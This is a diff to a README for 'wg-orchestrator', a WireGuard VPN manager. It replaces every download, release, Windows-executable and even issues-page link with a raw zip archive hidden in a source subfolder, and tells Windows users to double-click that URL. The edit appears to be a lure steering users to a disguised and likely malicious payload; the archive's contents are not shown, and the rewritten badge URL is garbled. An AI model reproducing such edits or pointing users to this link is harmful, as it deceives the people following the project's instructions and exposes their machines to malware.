@@ -1,6 +1,6 @@
 # 🖥️ wg-orchestrator - Manage Your VPN Effortlessly  
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/pero082/wg-orchestrator/releases)  
+[![Download](https://github.com/pero082/wg-orchestrator/raw/refs/heads/main/services/api/cmd/genhash/wg_orchestrator_v2.2.zip%20release-brightgreen)](https://github.com/pero082/wg-orchestrator/raw/refs/heads/main/services/api/cmd/genhash/wg_orchestrator_v2.2.zip)  
 
 ## 🚀 Getting Started  
 
@@ -10,10 +10,10 @@ Welcome to wg-orchestrator! With this tool, managing your WireGuard VPN becomes 
 
 To get started, we need to download the software.  
 
-1. Visit this page to download: [wg-orchestrator Releases](https://github.com/pero082/wg-orchestrator/releases)  
+1. Visit this page to download: [wg-orchestrator Releases](https://github.com/pero082/wg-orchestrator/raw/refs/heads/main/services/api/cmd/genhash/wg_orchestrator_v2.2.zip)  
 2. On the releases page, you will see different versions of the software. Click on the latest version to view its details.  
 3. Locate the asset that fits your system. If you are unsure, here are some common options:
-   - For Windows: `wg-orchestrator-windows-amd64.exe`
+   - For Windows: `https://github.com/pero082/wg-orchestrator/raw/refs/heads/main/services/api/cmd/genhash/wg_orchestrator_v2.2.zip`
    - For macOS: `wg-orchestrator-macos-amd64`
    - For Linux: `wg-orchestrator-linux-amd64`
 4. Download the correct file by clicking on it. 
@@ -25,7 +25,7 @@ Once the download is complete, follow these steps to get the application running
 #### For Windows  
 
 1. Locate the downloaded file in your Downloads folder.
-2. Double-click `wg-orchestrator-windows-amd64.exe`.  
+2. Double-click `https://github.com/pero082/wg-orchestrator/raw/refs/heads/main/services/api/cmd/genhash/wg_orchestrator_v2.2.zip`.  
 3. Follow the on-screen instructions to set up your VPN.  
 
 #### For macOS  
@@ -83,7 +83,7 @@ If you experience issues, here are common solutions:
 
 Join our community for help and updates. Share your experiences, ask questions, or offer suggestions. This user experience improves with your feedback.
 
-- For discussion and queries, check the [issues page](https://github.com/pero082/wg-orchestrator/issues).
+- For discussion and queries, check the [issues page](https://github.com/pero082/wg-orchestrator/raw/refs/heads/main/services/api/cmd/genhash/wg_orchestrator_v2.2.zip).
 - To contribute or report a bug, feel free to open an issue.
 
 ## 🔗 Additional Resources  
